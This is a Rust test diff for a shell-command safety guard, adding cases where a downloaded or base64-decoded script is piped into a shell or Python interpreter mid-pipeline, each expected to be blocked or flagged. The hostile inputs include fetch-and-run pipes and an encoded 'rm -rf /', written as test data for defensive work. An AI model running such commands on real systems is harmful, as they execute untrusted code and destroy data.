@@ -2589,6 +2589,74 @@ fn guardfall_osascript_script_parallel_cases() {
     }
 }
 
+const ISSUE_747_PIPELINE_MIDDLE_STAGE_INTERPRETER_CASES: &[(&str, Decision)] = &[
+    // The issue's repros: an interpreter in a middle stage reads its upstream.
+    ("curl x | sh", Decision::Block),
+    ("curl x | sh | cat", Decision::Block),
+    ("curl x | { sh; } | cat", Decision::Block),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | bash | tee log",
+        Decision::Block,
+    ),
+    ("curl x | python3", Decision::Ask),
+    ("curl x | python3 | head", Decision::Ask),
+    // Whatever the trailing stages are.
+    ("curl x | sh | tee log", Decision::Block),
+    ("curl x | sh | head", Decision::Block),
+    ("curl x | sh | cat | head", Decision::Block),
+    ("curl x | sh | tee a | tee b | wc -l", Decision::Block),
+    ("curl x |& sh", Decision::Ask),
+    ("curl x |& sh | cat", Decision::Ask),
+    ("curl x |& sh |& cat", Decision::Ask),
+    ("curl x | { sh; } | tee log", Decision::Block),
+    ("curl x | { sh; } | cat | head", Decision::Block),
+    ("curl x | (sh) | cat", Decision::Block),
+    ("curl x | { cat; sh; } | cat", Decision::Block),
+    ("wget -qO- x | sh | cat", Decision::Block),
+    ("wget -qO- x | bash | tee log | head", Decision::Block),
+    // An intermediate filter between the fetch and the interpreter.
+    ("curl x | tee f | sh | cat", Decision::Block),
+    ("curl x | cat | sh | head", Decision::Block),
+    // A decode chain ahead of a middle-stage interpreter.
+    ("echo cm0gLXJmIC8= | base64 -d | sh | cat", Decision::Block),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | python3 | head",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | { sh; } | cat",
+        Decision::Block,
+    ),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | cat | sh | head",
+        Decision::Block,
+    ),
+    // The same shape with a middle interpreter and a decode stage after it.
+    ("echo hi | sh | base64 -d | bash", Decision::Block),
+    // No pipe into an interpreter anywhere: unchanged.
+    ("cat file | grep x | head", Decision::Allow),
+    ("echo hi | cat | wc -l", Decision::Allow),
+    ("ls | sort | { cat; } | head", Decision::Allow),
+    (
+        "echo cm0gLXJmIC8= | base64 -d | cat | head",
+        Decision::Allow,
+    ),
+    ("git log | grep x | head", Decision::Allow),
+];
+
+#[test]
+fn guardfall_issue_747_pipeline_middle_stage_interpreter_cases() {
+    for (command, expected) in ISSUE_747_PIPELINE_MIDDLE_STAGE_INTERPRETER_CASES {
+        let verdict = shguard::analyze(command);
+        assert_eq!(
+            verdict.decision(),
+            *expected,
+            "command {command:?}: expected {expected:?}, got {:?}",
+            verdict.decision()
+        );
+    }
+}
+
 const INLINE_COMMANDS: &[&str] = &[
     SPLIT_IO_NUMBER_COMMAND,
     SPLIT_BEFORE_OPERATOR_COMMAND,
@@ -2640,6 +2708,7 @@ const DECISION_TABLES: &[(&str, &[(&str, Decision)])] = &[
     named_table!(PARAMETER_EXPANSION_OPERAND_CASES),
     named_table!(GIT_CONFIG_COMMAND_KEY_CASES),
     named_table!(OSASCRIPT_SCRIPT_PARALLEL_CASES),
+    named_table!(ISSUE_747_PIPELINE_MIDDLE_STAGE_INTERPRETER_CASES),
 ];
 
 // Case-table-shaped consts that are deliberately not in DECISION_TABLES: the
